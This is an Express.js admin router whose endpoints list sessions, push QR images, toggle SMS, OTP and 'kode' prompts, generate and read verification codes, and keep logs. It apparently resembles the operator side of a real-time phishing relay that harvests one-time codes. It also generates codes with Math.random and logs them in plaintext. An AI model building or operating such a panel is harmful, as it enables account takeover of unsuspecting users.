import { Router } from 'express'
import pool from '../db.js'
import { authMiddleware } from '../middleware/auth.js'

const router = Router()
router.use(authMiddleware)

router.get('/sessions', async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT s.*,
        (SELECT COUNT(*) FROM auth_log WHERE session_id = s.session_id) as log_count
       FROM sessions s ORDER BY s.created_at DESC LIMIT 50`
    )
    res.json(result.rows.map(s => ({
      sessionId: s.session_id, userId: s.user_id, status: s.status,
      qrVisible: s.qr_visible, qrImage: s.qr_image,
      smsActive: s.sms_active, otpActive: s.otp_active, kodeActive: s.kode_active,
      verificationCode: s.verification_code, logCount: parseInt(s.log_count),
      createdAt: s.created_at, verifiedAt: s.verified_at,
    })))
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

router.get('/session/:sessionId', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM sessions WHERE session_id = $1', [req.params.sessionId])
    if (result.rows.length === 0) return res.status(404).json({ error: 'Not found' })
    const s = result.rows[0]
    res.json({
      sessionId: s.session_id, userId: s.user_id, status: s.status,
      qrVisible: s.qr_visible, qrImage: s.qr_image,
      smsActive: s.sms_active, otpActive: s.otp_active, kodeActive: s.kode_active,
      verificationCode: s.verification_code, createdAt: s.created_at,
    })
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

router.patch('/session/:sessionId/qr', async (req, res) => {
  try {
    const { visible, qrImage } = req.body
    const sets = ['updated_at = NOW()']
    const vals = []
    let i = 1
    if (visible !== undefined) { sets.push(`qr_visible = $${i++}`); vals.push(visible) }
    if (qrImage !== undefined) { sets.push(`qr_image = $${i++}`); vals.push(qrImage) }
    vals.push(req.params.sessionId)

    const result = await pool.query(
      `UPDATE sessions SET ${sets.join(', ')} WHERE session_id = $${i} RETURNING *`, vals
    )
    if (result.rows.length === 0) return res.status(404).json({ error: 'Not found' })

    await pool.query(
      `INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'qr_updated', $2)`,
      [req.params.sessionId, visible ? 'QR shown' : 'QR hidden']
    )
    res.json({ ok: true })
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

router.patch('/session/:sessionId/status', async (req, res) => {
  try {
    const { field, value } = req.body
    const allowed = ['sms_active', 'otp_active', 'kode_active', 'status']
    if (!allowed.includes(field)) return res.status(400).json({ error: 'Invalid field' })

    const result = await pool.query(
      `UPDATE sessions SET ${field} = $1, updated_at = NOW() WHERE session_id = $2 RETURNING *`,
      [value, req.params.sessionId]
    )
    if (result.rows.length === 0) return res.status(404).json({ error: 'Not found' })

    await pool.query(
      `INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'status_toggle', $2)`,
      [req.params.sessionId, `${field} = ${value}`]
    )
    res.json({ ok: true })
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

router.post('/session/:sessionId/sms', async (req, res) => {
  try {
    const code = Math.floor(100000 + Math.random() * 900000).toString()
    await pool.query('INSERT INTO sms_codes (session_id, code) VALUES ($1, $2)', [req.params.sessionId, code])
    await pool.query(
      `INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'sms_sent', $2)`,
      [req.params.sessionId, `SMS code: ${code}`]
    )
    res.json({ code })
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

router.get('/session/:sessionId/sms', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT code, used, created_at FROM sms_codes WHERE session_id = $1 ORDER BY created_at DESC',
      [req.params.sessionId]
    )
    res.json(result.rows)
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

router.get('/session/:sessionId/log', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT event_type, detail, created_at FROM auth_log WHERE session_id = $1 ORDER BY created_at DESC LIMIT 50',
      [req.params.sessionId]
    )
    res.json(result.rows)
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

router.delete('/session/:sessionId', async (req, res) => {
  try {
    await pool.query('DELETE FROM sessions WHERE session_id = $1', [req.params.sessionId])
    res.json({ ok: true })
  } catch (err) {
    console.error(err)
    res.status(500).json({ error: 'Internal error' })
  }
})

export default router
